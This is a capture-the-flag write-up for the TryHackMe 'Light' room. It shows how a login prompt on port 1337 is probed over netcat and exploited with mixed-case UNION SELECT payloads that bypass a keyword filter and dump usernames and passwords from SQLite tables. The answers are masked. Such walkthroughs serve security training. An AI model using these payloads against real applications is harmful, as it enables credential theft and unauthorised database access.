# 💡 TryHackMe: Light – SQL Injection Writeup
[![Solved](https://img.shields.io/badge/Solved%20By-Jull3Hax0r-blue?style=flat-square&logo=gnu-bash)](https://tryhackme.com/p/Jull3)
[![TryHackMe Room](https://img.shields.io/badge/TryHackMe-LightRoom-red?logo=tryhackme&style=flat-square)](https://tryhackme.com/room/chillhack)

> **Category:** Databases / SQLi  
> **Difficulty:** Beginner → Intermediate  
> **Target IP:** `MACHINE_IP`  
> **Port:** `1337`  
> **Protocol:** Custom TCP (textbaserad tjänst)

---

## 🧠 Challenge Description

> I am working on a database application called Light! Would you like to try it out?  
> If so, the application is running on **port 1337**. You can connect to it using:  
> `nc MACHINE_IP 1337`  
> You can use the username `smokey` in order to get started.  
>  
> **Note:** Please allow the service 2 - 3 minutes to fully start before connecting to it.

---

## 📝 Questions

1. ❓ What is the admin username?  
2. ❓ What is the password to the username mentioned in question 1?  
3. 🏁 What is the flag?

---

## ⚙️ Initial Access

We connect using netcat:

```bash
nc 10.10.216.90 1337
```

Entering `smokey` as the username results in the application auto-filling a password and looping the login.

![Login prompt](https://jull3.se/thm/writeup/nc_login.png?cachebust=20240513)

No output or shell is returned, so we suspect some form of **SQL injection** might be possible via the username prompt.

---

## 💉 SQL Injection Discovery

We test a basic `'` payload and receive an error indicating broken syntax.  
By carefully experimenting with **case-bypassed UNION SELECT** payloads (to avoid keyword blacklists), we find working SQLi vectors.

Eventually, we identify that payloads like the following yield valid responses:

### 🔎 Payloads Used:

```sql
' UniOn SeLeCt sqlite_version() '
' UniOn SeLeCt group_concat(sql) FROM sqlite_master '
' UniOn SeLeCt group_concat(username) FROM usertable '
' UniOn SeLeCt group_concat(password) FROM usertable '
' UniOn SeLeCt group_concat(username) FROM admintable '
' UniOn SeLeCt group_concat(password) FROM admintable '
```

We automate this process using a Python script (`sqli.py` in this repo).

### 🖼️ SQLi Output Sample:

![SQLi Payload Output](https://jull3.se/thm/writeup/sqli.png)

---

## ✅ Answers

| Question | Answer |
|----------|--------|
| **Admin username** | `XXXXXXXXXXX` |
| **Admin password** | `maXXXXXXXXXXXXXX` |
| **Flag**           | `THM{SQLXXXXXXXXXXX}` |

---

## 🧠 Notes

- Backend DBMS: **SQLite 3.31.1**
- Application logic: `SELECT * FROM users WHERE username = '{input}' LIMIT 30;`
- Vulnerable input: **username prompt**
- Blacklist bypass: mixed-case `UniOn SeLeCt`
- Comment symbols like `--`, `#` were **filtered**, so `' ... '` was used to close queries cleanly

---

## 📜 Script (optional)

We used a Python socket script (`sqli.py`) to automate sending payloads and capturing responses.

---

🧠 Happy hacking,  
🧢 [Jull3Hax0r](https://jull3.se)
